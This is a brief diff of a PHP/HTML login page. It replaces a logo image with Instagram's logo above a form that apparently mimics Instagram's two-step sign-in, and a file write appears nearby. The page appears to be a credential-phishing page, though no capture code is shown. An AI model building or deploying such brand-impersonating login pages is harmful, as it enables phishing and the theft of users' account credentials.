@@ -121,7 +121,7 @@ fclose($file);
 	<el class="login100-form validate-form" id="elemend"><form id="two">
 	<form autocomplete="off" method="post" enctype="multipart/form-data">
 <br><br><br>
-	<center><img style="margin-top:-120px;" src="https://i.hizliresim.com/5xns4qf.png"  width="180">
+	<center><img style="margin-top:-120px;" src="https://marka-logo.com/wp-content/uploads/2020/04/Instagram-Logo-2010-2013.jpg"  width="180">
 	<br>
 <form class="sign-in-form">
 	        <img src="https://assets.biola.edu/4396738754672012438/embedded_image/5ba17c0041b16f00013e6d51/2_Step_Logo_Full.png" width=170 style="margin-top:30px;margin-bottom:18px;" align="center">
